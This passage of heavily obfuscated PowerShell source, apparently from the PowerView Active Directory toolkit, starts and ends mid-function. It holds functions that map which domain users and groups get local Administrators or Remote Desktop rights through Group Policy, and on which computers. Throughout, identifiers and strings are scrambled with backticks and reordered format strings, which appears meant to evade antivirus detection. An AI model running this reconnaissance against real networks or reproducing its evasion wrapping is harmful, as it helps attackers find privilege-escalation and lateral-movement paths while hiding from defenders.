                            elseif (${gROu`P`Name} -match ("{1}{0}"-f'ts','Gues')) {
                                ${G`R`OUps`iD} = ("{0}{1}{2}" -f 'S-','1-5-','32-546')
                            }
                            elseif (${GROup`N`AME}.("{1}{0}"-f'rim','T').Invoke() -ne '') {
                                ${CoNve`R`TToa`RGUMeN`Ts} = @{("{2}{0}{1}" -f'ectNam','e','Obj') = ${grouP`N`A`ME}}
                                if (${pSbOuN`DpA`R`AMETERS}[("{0}{1}" -f'D','omain')]) { ${COnveR`T`TO`A`RGumENts}[("{1}{0}"-f'in','Doma')] = ${DOm`AiN} }
                                ${GROu`p`SId} = &("{2}{1}{0}"-f 'To-SID','onvert','C') @ConvertToArguments
                            }
                            else {
                                ${G`ROUP`siD} = ${nu`Ll}
                            }
                        }
                    }

                    ${g`pOGRo`Up} = &("{0}{1}{2}{3}" -f'New','-','Obje','ct') ("{2}{1}{0}" -f 't','bjec','PSO')
                    ${GP`OGR`OUP} | &("{2}{0}{1}" -f'd-','Member','Ad') ("{0}{1}{3}{2}" -f'No','te','ty','proper') ("{1}{0}{4}{3}{2}" -f'Di','GPO','e','yNam','spla') ${gPOd`ISpla`YN`A`me}
                    ${Gpo`GrOUp} | &("{1}{0}{2}" -f'-','Add','Member') ("{1}{2}{0}"-f 'ty','Notep','roper') ("{1}{0}{2}" -f'ON','GP','ame') ${gpoN`AMe}
                    ${g`po`grOup} | &("{2}{0}{1}" -f 'd-','Member','Ad') ("{2}{0}{3}{1}" -f 'tepr','erty','No','op') ("{2}{1}{0}"-f'OPath','P','G') ${Gpo`PA`Th}
                    ${gPog`RO`Up} | &("{0}{1}{2}" -f 'Ad','d-Me','mber') ("{3}{1}{2}{0}" -f'rty','oteprop','e','N') ("{0}{1}" -f 'GPOT','ype') ("{1}{0}{2}{3}"-f 'edGro','Restrict','u','ps')
                    ${g`P`oGR`OUP} | &("{3}{1}{2}{0}" -f'ber','d-','Mem','Ad') ("{0}{3}{2}{1}" -f 'No','ty','eproper','t') ("{2}{1}{0}"-f 'ers','t','Fil') ${Nu`ll}
                    ${g`PO`GRoUP} | &("{1}{2}{0}"-f'ember','Add','-M') ("{2}{1}{0}" -f'ty','per','Notepro') ("{1}{2}{0}"-f'e','Group','Nam') ${groU`PN`A`me}
                    ${gPO`G`RoUP} | &("{2}{0}{1}" -f'mbe','r','Add-Me') ("{2}{0}{1}" -f 'ro','perty','Notep') ("{0}{1}{2}"-f'Grou','p','SID') ${GRo`U`PSID}
                    ${gP`OGro`Up} | &("{2}{3}{1}{0}"-f 'r','Membe','Ad','d-') ("{0}{1}{2}{3}" -f'Not','e','prope','rty') ("{2}{0}{1}"-f'mber','Of','GroupMe') ${ME`m`BeRs`HIP}."vA`lUe"."Me`mb`eRof"
                    ${g`PO`G`RoUp} | &("{2}{0}{1}" -f 'e','r','Add-Memb') ("{2}{0}{3}{1}" -f 'tepr','rty','No','ope') ("{1}{2}{0}"-f 's','GroupM','ember') ${MEmbe`RSh`ip}."va`Lue"."MeMB`e`Rs"
                    ${gpo`gRouP}."p`soBJECT"."type`NA`MES".("{1}{0}"-f'ert','Ins').Invoke(0, ("{2}{4}{1}{0}{3}"-f'GPO','iew.','Powe','Group','rV'))
                    ${g`P`o`gRouP}
                }
            }

            
            ${pAr`s`earGs} =  @{
                ("{0}{4}{2}{1}{3}" -f 'G','sX','p','MLpath','rou') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            &("{3}{0}{1}{2}"-f'et-Grou','ps','XML','G') @ParseArgs | &("{1}{3}{2}{0}" -f'ect','For','ch-Obj','Ea') {
                if (${p`S`BOUn`dpA`RamEterS}[("{0}{2}{1}{3}"-f'ResolveMe','rsToSI','mbe','Ds')]) {
                    ${G`ROUp`m`eM`BeRS} = @()
                    ForEach (${M`EM`BeR} in ${_}."gR`Oup`MEmBeRs") {
                        if (${mE`Mb`eR} -and (${M`e`MBEr}.("{0}{1}" -f'T','rim').Invoke() -ne '')) {
                            if (${M`E`MBER} -notmatch ("{2}{1}{0}"-f'-1-.*','S','^')) {

                                
                                ${cONveRt`T`O`A`R`gUMen`Ts} = @{("{1}{0}{2}{3}"-f 'b','O','je','ctName') = ${G`RoU`PnAMe}}
                                if (${pSBOun`dP`ARam`ete`RS}[("{0}{1}"-f'Do','main')]) { ${CONvER`TToAR`gumEN`Ts}[("{1}{2}{0}"-f 'main','D','o')] = ${dO`MAIn} }
                                ${m`eMBerS`id} = &("{2}{0}{3}{1}"-f 'S','D','ConvertTo-','I') -Domain ${d`o`MAIn} -ObjectName ${mem`B`Er}

                                if (${mEMb`e`Rs`Id}) {
                                    ${G`RoUpMem`BErs} += ${mE`MbERS`Id}
                                }
                                else {
                                    ${G`ROu`pM`EmBerS} += ${ME`MBer}
                                }
                            }
                            else {
                                ${GRoUpmeM`Be`Rs} += ${mEm`B`eR}
                            }
                        }
                    }
                    ${_}."grOupm`Em`BErs" = ${GRO`UpMemb`ErS}
                }

                ${_} | &("{0}{2}{1}" -f'Ad','mber','d-Me') ("{1}{0}{2}" -f'tepr','No','operty') ("{2}{4}{1}{3}{0}" -f 'ame','p','GPODi','layN','s') ${gpo`di`SPl`Ayname}
                ${_} | &("{2}{0}{1}" -f'Membe','r','Add-') ("{3}{0}{2}{1}"-f 'ot','roperty','ep','N') ("{1}{0}"-f'me','GPONa') ${GP`oN`Ame}
                ${_} | &("{2}{1}{0}"-f'er','mb','Add-Me') ("{0}{2}{1}"-f 'N','ty','oteproper') ("{2}{1}{0}"-f'OType','P','G') ("{2}{1}{3}{4}{0}" -f 'references','i','GroupPol','cy','P')
                ${_}."P`soBJE`Ct"."typ`eNa`Mes".("{1}{0}" -f't','Inser').Invoke(0, ("{0}{2}{4}{1}{5}{3}" -f 'Powe','ro','rVi','p','ew.GPOG','u'))
                ${_}
            }
        }
    }
}


function gE`T-d`o`MAinGPoUsErLoCalgROU`pmA`pping {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{3}{1}{0}" -f 'ss','e','dP','roc','PSShoul'}, '')]
    [OutputType({"{10}{0}{8}{6}{9}{2}{1}{5}{7}{4}{3}"-f 'rV','o','lGr','ing','p','upM','w.G','ap','ie','POUserLoca','Powe'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSiTiON = 0, vAlUEfroMpIPEline = ${T`Rue}, vAluEfROMPIPELinEByPROpeRtyNaMe = ${tr`UE})]
        [Alias({"{4}{2}{0}{1}{3}" -f 'sh','e','ingui','dName','Dist'}, {"{2}{0}{3}{1}"-f 'mA','untName','Sa','cco'}, {"{0}{1}" -f 'N','ame'})]
        [String]
        ${iDEN`Ti`Ty},

        [String]
        [ValidateSet({"{4}{1}{0}{2}{3}" -f'i','in','str','ators','Adm'}, {"{3}{2}{1}{0}"-f'4','54','-5-32-','S-1'}, 'RDP', {"{0}{5}{2}{4}{1}{3}" -f 'Rem','s','k','ers','top U','ote Des'}, {"{1}{2}{0}" -f'55','S','-1-5-32-5'})]
        ${l`ocALGR`oUP} = ("{3}{4}{1}{0}{2}" -f'r','strato','s','Adm','ini'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'SPat','AD','h'})]
        [String]
        ${SeArC`hB`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{3}{0}{2}" -f 'nControlle','a','r','i','Dom'})]
        [String]
        ${S`Er`VeR},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{2}{0}{1}"-f'eLev','el','On'}, {"{0}{1}"-f 'Subt','ree'})]
        [String]
        ${Se`ARCh`Sc`OPE} = ("{1}{0}"-f'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsULTpA`gesi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RvER`TImEL`imit},

        [Switch]
        ${T`omBs`T`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`E`dENtI`AL} =   ${q`FN}::"EmP`Ty"
    )

    BEGIN {
        ${cOmm`ONAr`G`UmeN`Ts} = @{}
        if (${p`s`BoUNDPa`R`AmE`TerS}[("{1}{0}" -f'ain','Dom')]) { ${COMmONAR`gum`En`Ts}[("{2}{1}{0}"-f'n','i','Doma')] = ${DoMA`in} }
        if (${Ps`BounDp`ARam`E`T`erS}[("{1}{0}"-f 'er','Serv')]) { ${cO`Mmona`Rgu`M`ENtS}[("{1}{2}{0}"-f 'rver','S','e')] = ${S`E`RVer} }
        if (${p`Sb`ouNDparam`ETe`Rs}[("{1}{2}{0}"-f 'pe','Se','archSco')]) { ${cOmmon`ArG`UM`eNTs}[("{0}{1}{2}"-f'Se','arc','hScope')] = ${seArC`Hs`CopE} }
        if (${PSBOun`DPAr`AM`eTe`Rs}[("{3}{2}{0}{1}"-f'e','Size','tPag','Resul')]) { ${Co`mMon`ArGu`me`NTS}[("{2}{0}{1}"-f'sultPageSiz','e','Re')] = ${re`S`ULtPagEsI`ZE} }
        if (${P`sBo`UNDP`Aram`ETeRS}[("{0}{2}{1}"-f 'Serv','mit','erTimeLi')]) { ${com`MO`NaR`guME`NTs}[("{1}{3}{0}{2}{4}"-f 've','S','r','er','TimeLimit')] = ${seR`VErtIm`Elim`IT} }
        if (${PSb`OunD`PaR`AmEt`ERS}[("{1}{0}" -f 'ombstone','T')]) { ${c`OM`M`OnARGuME`NtS}[("{2}{0}{1}"-f 's','tone','Tomb')] = ${T`omBS`TonE} }
        if (${P`SbOuNd`PAra`meT`eRs}[("{2}{1}{0}"-f'l','edentia','Cr')]) { ${CoMMOnA`Rg`UMEN`Ts}[("{0}{2}{1}" -f 'Crede','ial','nt')] = ${CR`eD`EnTiaL} }
    }

    PROCESS {
        ${Tar`gET`sIDS} = @()

        if (${psB`o`UNdpara`metErs}[("{2}{1}{0}"-f'y','tit','Iden')]) {
            ${TA`R`GEtsIds} += &("{0}{1}{2}{3}" -f'Get-Dom','a','in','Object') @CommonArguments -Identity ${id`ENT`I`TY} | &("{1}{0}{3}{4}{2}" -f'elect-','S','t','Ob','jec') -Expand ("{0}{1}" -f'ob','jectsid')
            ${t`ARgE`ToBjE`cT`siD} = ${TARGe`T`sIDS}
            if (-not ${t`ArGEts`Ids}) {
                Throw ('[Ge'+'t-D'+'omain'+'GPOUser'+'LocalGr'+'o'+'u'+'pMapping] '+'Una'+'b'+'le '+'to'+' '+'re'+'triev'+'e '+'S'+'ID '+'f'+'or '+'ide'+'n'+'tity '+"'$Identity'")
            }
        }
        else {
            
            ${Ta`RGeT`siDs} = @('*')
        }

        if (${LoCAlGr`o`Up} -match ("{0}{1}" -f 'S','-1-5')) {
            ${TaRg`ETL`oCA`Ls`id} = ${LoC`ALGRO`Up}
        }
        elseif (${l`Oc`AlGRO`Up} -match ("{1}{0}"-f 'dmin','A')) {
            ${T`ARGE`TLo`Calsid} = ("{0}{2}{1}" -f'S-1-','-544','5-32')
        }
        else {
            
            ${t`Arge`TLOCaLS`iD} = ("{0}{1}{2}"-f'S-1-','5-32-','555')
        }

        if (${taRgeT`SI`ds}[0] -ne '*') {
            ForEach (${tAR`g`ets`id} in ${tARgET`s`Ids}) {
                &("{3}{2}{1}{0}"-f 'rbose','-Ve','rite','W') ('[Ge'+'t-D'+'o'+'mainGPOU'+'se'+'rLo'+'calGro'+'up'+'Map'+'ping] '+'E'+'n'+'umeratin'+'g '+'nest'+'ed '+'gr'+'o'+'up '+'mem'+'bersh'+'ips '+'fo'+'r: '+"'$TargetSid'")
                ${taRGe`T`siDS} += &("{3}{2}{4}{1}{0}"-f 'roup','nG','t-Dom','Ge','ai') @CommonArguments -Properties ("{1}{2}{0}" -f 'd','o','bjectsi') -MemberIdentity ${TA`RgetS`Id} | &("{2}{0}{1}"-f 'lect-Ob','ject','Se') -ExpandProperty ("{1}{0}" -f'tsid','objec')
            }
        }

        &("{3}{0}{2}{1}"-f'rite-Verb','e','os','W') ('['+'Ge'+'t'+'-'+'Doma'+'i'+'nGPOU'+'serLocalGroup'+'Map'+'p'+'ing'+'] '+'Target'+' '+'loc'+'algro'+'up '+'SID:'+' '+"$TargetLocalSID")
        &("{0}{3}{2}{1}"-f 'W','Verbose','-','rite') ('[G'+'et'+'-'+'Do'+'mainGPO'+'UserLoc'+'alGro'+'up'+'Map'+'pin'+'g] '+'Eff'+'ec'+'tive '+'targe'+'t'+' '+'do'+'ma'+'in '+'SI'+'Ds: '+"$TargetSIDs")

        ${G`POgR`oups} = &("{0}{4}{2}{3}{1}{5}"-f 'Get-D','L','inG','PO','oma','ocalGroup') @CommonArguments -ResolveMembersToSIDs | &("{3}{2}{4}{1}{0}" -f 't','c','rE','Fo','ach-Obje') {
            ${G`Po`g`ROup} = ${_}
            
            if (${Gp`o`GrOuP}."gRO`U`PsId" -match ${targ`ETLOc`ALS`ID}) {
                ${GPo`GRo`UP}."gR`ouPM`eMb`eRS" | &("{1}{0}{2}"-f 're-Objec','Whe','t') {${_}} | &("{1}{2}{0}" -f 't','F','orEach-Objec') {
                    if ( (${T`A`RgEtS`IDs}[0] -eq '*') -or (${TArG`ETSi`ds} -Contains ${_}) ) {
                        ${g`P`oGRouP}
                    }
                }
            }
            
            if ( (${GPO`gR`Oup}."gRoupmem`B`E`RoF" -contains ${tA`R`GetlocAlSID}) ) {
                if ( (${tArg`eT`SiDs}[0] -eq '*') -or (${t`Ar`gets`iDS} -Contains ${G`pogrOup}."GrO`U`pSiD") ) {
                    ${gPogR`O`Up}
                }
            }
        } | &("{0}{3}{1}{2}"-f 'S','Objec','t','ort-') -Property ("{0}{1}" -f'GPONam','e') -Unique

        ${gP`o`GrOUPS} | &("{0}{1}{2}" -f'Wh','ere-','Object') {${_}} | &("{2}{0}{1}"-f 'Each-Obje','ct','For') {
            ${g`pONA`Me} = ${_}."g`P`O`d`iSPLayname"
            ${g`pOGU`iD} = ${_}."GPo`NAme"
            ${G`POPA`TH} = ${_}."g`PoPAth"
            ${Gpot`ypE} = ${_}."gP`OType"
            if (${_}."grO`UPmEM`BE`RS") {
                ${g`pOmE`m`BeRs} = ${_}."G`R`Ou`pmembErS"
            }
            else {
                ${G`POMEMB`ERS} = ${_}."GRoU`pS`iD"
            }

            ${FILt`ERS} = ${_}."fil`TeRs"

            if (${T`A`RGEtSiDs}[0] -eq '*') {
                
                ${tArG`e`TOb`JecTsidS} = ${g`Pom`eMbe`Rs}
            }
            else {
                ${tARGEtoBJe`ct`s`ids} = ${TA`RgE`TOB`jeCtS`iD}
            }

            
            &("{0}{2}{3}{1}" -f 'G','-DomainOU','e','t') @CommonArguments -Raw -Properties ("{0}{3}{2}{4}{1}"-f'name,distinguish','me','d','e','na') -GPLink ${g`pO`GuID} | &("{0}{2}{1}"-f'For','ach-Object','E') {
                if (${FIlt`e`RS}) {
                    ${ouCOM`pu`TerS} = &("{5}{0}{3}{2}{1}{4}" -f'et','ainC','Dom','-','omputer','G') @CommonArguments -Properties ("{2}{5}{4}{3}{0}{1}{6}" -f'sting','uishedna','dn','i','ostname,d','sh','me') -SearchBase ${_}."P`ATH" | &("{1}{2}{0}" -f't','W','here-Objec') {${_}."DiS`Tin`g`Uish`edName" -match (${f`il`TErs}."VAl`Ue")} | &("{1}{2}{0}"-f 'bject','Se','lect-O') -ExpandProperty ("{1}{0}{2}"-f 'shostn','dn','ame')
                }
                else {
                    ${o`Ucomp`UTErS} = &("{0}{3}{1}{2}"-f'G','Comput','er','et-Domain') @CommonArguments -Properties ("{2}{3}{0}{1}" -f'tnam','e','dnsho','s') -SearchBase ${_}."pa`TH" | &("{0}{2}{1}" -f'Se','ct-Object','le') -ExpandProperty ("{2}{1}{0}" -f'hostname','ns','d')
                }

                if (${ou`c`oMPute`RS}) {
                    if (${oUc`OmP`U`TeRS} -isnot [System.Array]) {${oU`ComPU`T`Ers} = @(${Ou`COmpU`TErs})}

                    ForEach (${TA`R`getSid} in ${TARg`ET`obJEct`SI`DS}) {
                        ${Obj`eCT} = &("{2}{0}{3}{1}{4}"-f'et-Domain','bj','G','O','ect') @CommonArguments -Identity ${Tar`g`EtsId} -Properties ("{2}{8}{5}{13}{4}{6}{9}{10}{3}{0}{7}{12}{1}{11}" -f'ng','s','samaccoun',',disti','c',',sam','co','uishedname,ob','ttype','untn','ame','id','ject','a')

                        ${iSGR`O`Up} = @(("{0}{1}" -f'26843545','6'),("{1}{0}{2}" -f'6','2','8435457'),("{1}{2}{3}{0}"-f '2','5368','709','1'),("{2}{0}{1}"-f '36','870913','5')) -contains ${o`B`jecT}."SaMaCC`OunT`Ty`pe"

                        ${gp`ol`o`C`AlGROu`pmaPpiNg} = &("{2}{0}{1}"-f'-Objec','t','New') ("{1}{0}" -f 't','PSObjec')
                        ${GP`OlOCALgRou`PMA`pp`iNg} | &("{1}{0}{2}"-f'dd-M','A','ember') ("{0}{3}{1}{2}"-f'N','oper','ty','otepr') ("{0}{1}{2}"-f'Obj','e','ctName') ${Obj`e`ct}."s`AmAcCOU`NTNA`mE"
                        ${gpoL`ocAl`groU`pm`Ap`pING} | &("{2}{1}{0}{3}"-f'-Me','d','Ad','mber') ("{3}{0}{2}{1}"-f 'rop','ty','er','Notep') ("{2}{0}{1}" -f 'c','tDN','Obje') ${obj`ECt}."D`IStiNGUiS`hEdnA`me"
                        ${g`pOLoCA`L`GROU`Pm`APping} | &("{0}{1}{2}" -f 'Add','-Mem','ber') ("{2}{3}{0}{1}" -f 'prope','rty','Not','e') ("{0}{1}{2}" -f'O','bject','SID') ${Obj`E`CT}."o`BjeCTs`id"
                        ${g`polOC`ALgR`oUPMA`pp`Ing} | &("{0}{2}{1}"-f'A','er','dd-Memb') ("{0}{1}{3}{2}"-f 'N','otepr','perty','o') ("{1}{0}"-f'in','Doma') ${d`oma`iN}
                        ${G`PoL`OCalgROup`MApP`INg} | &("{1}{0}{2}"-f'd','A','d-Member') ("{0}{2}{1}" -f'Notep','rty','rope') ("{0}{2}{1}" -f'IsG','p','rou') ${ISGRO`Up}
                        ${G`P`oLO`cAlgroupmappiNG} | &("{0}{3}{2}{1}"-f'A','ber','-Mem','dd') ("{2}{1}{0}{3}"-f'ope','r','Notep','rty') ("{1}{0}{2}{3}"-f 'P','G','ODis','playName') ${Gp`On`AME}
                        ${GpOlO`ca`lGROu`PMAP`pinG} | &("{2}{1}{3}{0}" -f 'er','dd-','A','Memb') ("{2}{3}{1}{0}" -f 'erty','rop','Not','ep') ("{1}{0}"-f 'uid','GPOG') ${Gpo`Gu`id}
                        ${gP`o`LO`CAlGrOuPMaPpi`NG} | &("{0}{1}{2}"-f 'A','dd','-Member') ("{1}{0}{2}" -f 'er','Noteprop','ty') ("{2}{1}{0}" -f 'th','POPa','G') ${g`PopA`Th}
                        ${gPoLOcaL`gr`o`U`pMAppinG} | &("{0}{2}{1}"-f 'Ad','ber','d-Mem') ("{2}{3}{1}{0}" -f 'ty','r','N','oteprope') ("{0}{1}" -f'GP','OType') ${gPOt`Y`pe}
                        ${GPO`LOC`Alg`Rou`pmaPPi`NG} | &("{0}{2}{3}{1}" -f 'Add','er','-M','emb') ("{1}{0}{2}"-f'o','Notepr','perty') ("{4}{0}{1}{2}{3}" -f 'on','tainer','N','ame','C') ${_}."Pr`O`PE`RTIes"."DIsTING`U`is`HeDNamE"
                        ${GP`Olo`cAlGr`OUP`MAPPi`Ng} | &("{3}{0}{2}{1}"-f'd-','ber','Mem','Ad') ("{1}{0}{2}"-f 'epr','Not','operty') ("{0}{2}{1}" -f'Co','uterName','mp') ${OUc`O`mpu`Ters}
                        ${gpolocAL`grOUp`m`A`ppInG}."PsObJ`eCT"."TYp`e`NaMes".("{0}{1}" -f'Ins','ert').Invoke(0, ("{8}{1}{0}{6}{7}{3}{5}{4}{2}"-f 'rView.','e','ng','pM','pi','ap','GPOLocalG','rou','Pow'))
                        ${gpoloC`ALG`R`OUPMaPP`I`NG}
                    }
                }
            }

            
            &("{2}{0}{1}"-f 'inSi','te','Get-Doma') @CommonArguments -Properties ("{4}{0}{1}{6}{2}{5}{3}" -f 'ite','objectbl,disting','she','ame','s','dn','ui') -GPLink ${GP`Og`Uid} | &("{0}{3}{1}{2}" -f 'ForEa','Obje','ct','ch-') {
                ForEach (${tArG`Ets`Id} in ${t`A`RGEtObjEctSi`Ds}) {
                    ${Ob`Je`cT} = &("{2}{3}{1}{0}{4}" -f 'Dom','-','G','et','ainObject') @CommonArguments -Identity ${TAr`G`EtSid} -Properties ("{13}{0}{14}{1}{11}{3}{4}{5}{2}{17}{12}{16}{10}{6}{15}{8}{7}{9}" -f'a','ac','ma','ty','p','e,sa','he','jectsi','e,ob','d','s','count','tname,distin','s','m','dnam','gui','ccoun')

                    ${Is`gR`OUp} = @(("{0}{1}"-f'268435','456'),("{1}{0}{2}"-f'35','2684','457'),("{0}{1}{2}"-f'536','8709','12'),("{1}{0}{2}"-f '7091','5368','3')) -contains ${obJ`eCt}."s`AmaCcOuN`TT`ypE"

                    ${GPOloC`A`L`GrO`UpMa`PPinG} = &("{2}{0}{1}"-f '-Objec','t','New') ("{1}{0}"-f't','PSObjec')
                    ${GPoLOc`A`l`gRoupMaP`pI`Ng} | &("{0}{1}{2}"-f'Add','-','Member') ("{2}{0}{3}{1}"-f'tepr','rty','No','ope') ("{2}{0}{1}" -f 'bjectN','ame','O') ${OB`jecT}."samA`C`Co`U`NTNaMe"
                    ${gPO`LOcAlG`R`ou`P`MA`PPINg} | &("{1}{2}{0}"-f 'r','Ad','d-Membe') ("{2}{1}{3}{0}"-f'ty','epro','Not','per') ("{2}{0}{1}"-f 'bjectD','N','O') ${o`B`jeCT}."D`IS`TI`NGUishEdname"
                    ${gpolocAlgrO`UPMaP`pI`Ng} | &("{0}{2}{1}"-f 'A','mber','dd-Me') ("{2}{1}{0}"-f'y','pert','Notepro') ("{2}{1}{0}" -f'tSID','ec','Obj') ${oB`je`cT}."OBJeCt`SiD"
                    ${gpol`O`C`ALgrOuPmap`PIng} | &("{0}{1}{2}"-f'Add-M','em','ber') ("{0}{2}{3}{1}"-f 'No','perty','tepr','o') ("{0}{1}"-f'IsGrou','p') ${I`sgRoUP}
                    ${gpO`locALGRO`U`pMa`P`PING} | &("{0}{1}{2}"-f 'Add-M','emb','er') ("{3}{0}{1}{2}" -f't','ep','roperty','No') ("{0}{1}" -f'Do','main') ${d`om`AiN}
                    ${GpO`LOCal`groU`PmA`PP`i`Ng} | &("{1}{0}{2}"-f 'dd-Membe','A','r') ("{0}{1}{3}{2}"-f 'Notepro','pe','y','rt') ("{1}{0}{2}"-f 'p','GPODis','layName') ${GpON`A`mE}
                    ${GpOloC`A`L`g`ROUPMap`PI`Ng} | &("{2}{1}{0}" -f'ber','dd-Mem','A') ("{3}{0}{1}{2}"-f 'prop','e','rty','Note') ("{0}{1}" -f'G','POGuid') ${g`Po`Guid}
                    ${Gp`oloc`ALGrOuP`MApPiNG} | &("{2}{0}{1}"-f'd','d-Member','A') ("{3}{0}{2}{1}" -f'pro','erty','p','Note') ("{2}{1}{0}"-f 'th','Pa','GPO') ${g`poPA`TH}
                    ${GPO`LOCa`LGRoU`PmapPInG} | &("{3}{1}{2}{0}" -f 'ber','d-M','em','Ad') ("{0}{1}{2}"-f 'Noteprope','r','ty') ("{0}{1}{2}" -f'GPO','Ty','pe') ${gpo`TYPe}
                    ${g`po`locAL`g`ROuP`mAPpiNG} | &("{1}{0}{2}"-f'dd-Me','A','mber') ("{3}{0}{2}{1}"-f'oteprope','y','rt','N') ("{2}{1}{0}" -f'ainerName','nt','Co') ${_}."D`IS`TiNGuI`sHeDnaMe"
                    ${g`PoL`Oc`AlgR`OuPMaP`piNG} | &("{2}{1}{0}"-f'ber','em','Add-M') ("{2}{1}{3}{0}" -f 'erty','tepr','No','op') ("{3}{1}{0}{2}"-f 'uterNa','p','me','Com') ${_}."siT`eobJECt`BL"
                    ${G`PoL`OCALGRO`Up`MappinG}."PSo`Bj`EcT"."t`yPENam`ES".("{0}{1}"-f 'Ad','d').Invoke(("{4}{1}{0}{3}{2}"-f 'calGroupM','owerView.GPOLo','pping','a','P'))
                    ${GP`olocALgrOUp`M`A`Ppi`NG}
                }
            }
        }
    }
}


function g`E`T-DomAingpO`comPU`TeRL`oC`ALG`R`OupMaP`P`INg {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}"-f 'oce','PSShou','ss','ldPr'}, '')]
    [OutputType({"{4}{0}{3}{5}{1}{6}{7}{8}{2}"-f'rView.GGP','terL','mber','OCom','Powe','pu','ocal','Group','Me'})]
    [CmdletBinding(DEfAulTpARameterSEtnaME = {"{2}{4}{0}{3}{1}"-f'puterIdenti','y','Co','t','m'})]
    Param(
        [Parameter(pOSItion = 0, ParaMETErSetname = "ComP`U`Ter`iDEN`TiTY", maNdatORY = ${TR`UE}, valUEFROMpIPelinE = ${T`RuE}, VAluEfromPipElInebyPropeRtynamE = ${t`RUE})]
        [Alias({"{2}{1}{0}"-f 'ame','mputerN','Co'}, {"{1}{0}{2}"-f 'e','Comput','r'}, {"{5}{2}{1}{4}{0}{3}"-f'uishedN','stin','i','ame','g','D'}, {"{3}{2}{1}{0}{4}"-f'Nam','t','un','SamAcco','e'}, {"{0}{1}"-f'Na','me'})]
        [String]
        ${c`oMPu`Te`Ri`dE`NtiTY},

        [Parameter(manDaTOry = ${Tr`Ue}, PaRAmeterSeTNAmE = "ou`ide`NtITY")]
        [Alias('OU')]
        [String]
        ${O`UIdE`N`TITy},

        [String]
        [ValidateSet({"{1}{3}{4}{2}{0}"-f'ors','A','at','dmi','nistr'}, {"{1}{0}{2}{3}"-f '1-5','S-','-32-54','4'}, 'RDP', {"{2}{5}{4}{0}{3}{1}" -f'ktop','Users','R',' ','s','emote De'}, {"{0}{1}{2}" -f'S','-','1-5-32-555'})]
        ${L`ocAl`gRoUP} = ("{1}{2}{0}{3}" -f 'o','Ad','ministrat','rs'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`main},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f'a','th','ADSP'})]
        [String]
        ${S`earC`hBASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}" -f'Doma','ll','inContro','er'})]
        [String]
        ${sEr`V`eR},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{1}{2}{0}" -f'l','OneL','eve'}, {"{0}{1}" -f 'Subt','ree'})]
        [String]
        ${SE`ArCH`sco`pe} = ("{2}{0}{1}"-f'bt','ree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Res`Ul`TpA`Gesize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`e`RveRTiM`elIm`IT},

        [Switch]
        ${tO`M`BStone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDenT`I`AL} =  ( vAriAblE ("qf"+"n") )."VA`lue"::"E`MPTY"
    )

    BEGIN {
        ${COmMoNa`Rgum`EnTs} = @{}
        if (${psB`OUnDparAm`ETe`Rs}[("{1}{0}{2}" -f 'i','Doma','n')]) { ${COM`mO`N`AR`gumENtS}[("{1}{0}" -f 'n','Domai')] = ${d`OMaIn} }
        if (${pSboUNDP`A`RA`M`ETe`RS}[("{1}{0}" -f 'er','Serv')]) { ${CO`MmO`NAR`GUMEnts}[("{0}{1}"-f 'Ser','ver')] = ${sE`RVer} }
        if (${pSBOundP`A`R`Am`eTErS}[("{1}{0}{2}"-f 'h','Searc','Scope')]) { ${COmmoNa`R`GU`m`ents}[("{1}{2}{0}"-f 'ope','SearchS','c')] = ${seA`RcHs`coPE} }
        if (${PSbo`UnDPaRaM`e`T`ers}[("{3}{4}{2}{0}{1}" -f'geSi','ze','a','R','esultP')]) { ${coMM`oNA`R`G`UmeNTs}[("{1}{0}{2}{3}{4}"-f 'ultPa','Res','g','eSi','ze')] = ${RES`U`LTPagE`siZE} }
        if (${pSboUndP`ARamE`T`ErS}[("{2}{3}{1}{0}" -f 't','Limi','Serv','erTime')]) { ${coMM`o`N`ARGuMEn`Ts}[("{3}{2}{0}{1}" -f'imeLi','mit','verT','Ser')] = ${S`ErvertiME`l`I`MIT} }
        if (${Ps`BOundpaRamE`T`ErS}[("{2}{0}{1}{3}" -f'm','bsto','To','ne')]) { ${c`oMM`on`ARG`UmEnts}[("{0}{1}{2}"-f 'To','mbston','e')] = ${T`ombstO`NE} }
        if (${P`sbOUN`DpARA`M`etERS}[("{2}{0}{1}"-f'redenti','al','C')]) { ${c`O`mMo`NaRGUmEnTS}[("{2}{0}{3}{1}" -f 'edent','al','Cr','i')] = ${c`RedEN`TIAL} }
    }

    PROCESS {
        if (${Ps`Bo`UN`DpAR`AMEtErS}[("{1}{2}{0}{3}" -f 'Ident','Comp','uter','ity')]) {
            ${CO`Mp`U`TerS} = &("{3}{1}{4}{2}{0}" -f 'nComputer','t','mai','Ge','-Do') @CommonArguments -Identity ${COM`puT`ERidENT`i`TY} -Properties ("{0}{1}{5}{4}{3}{2}" -f 'distingu','ishedn','ame','n','dnshost','ame,')

            if (-not ${CO`mPUTE`RS}) {
                throw ('[Ge'+'t'+'-DomainG'+'PO'+'Comput'+'er'+'Loca'+'lGr'+'oupMa'+'pping]'+' '+'Co'+'mputer '+"$ComputerIdentity "+'n'+'ot '+'f'+'o'+'und. '+'T'+'ry '+'a '+'fully'+' '+'q'+'uali'+'fi'+'ed '+'h'+'ost '+'nam'+'e.')
            }

            ForEach (${co`M`pUTer} in ${c`OMp`UT`erS}) {

                ${gPoGU`I`DS} = @()

                
                ${dn} = ${coMpU`T`er}."d`IStin`GUi`s`HeDNaME"
